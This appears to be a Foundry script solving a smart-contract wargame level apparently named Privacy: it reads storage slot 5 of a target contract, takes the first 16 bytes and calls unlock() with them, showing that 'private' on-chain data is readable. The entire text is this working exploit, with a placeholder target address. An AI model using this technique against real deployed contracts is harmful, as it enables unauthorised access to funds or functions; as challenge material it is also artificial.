// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacySolution is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // read slot 5 (data[2])
        bytes32 data = vm.load(target, bytes32(uint256(5)));

        // take first 16 bytes
        bytes16 key = bytes16(data);

        IPrivacy(target).unlock(key);

        vm.stopBroadcast();
    }
}
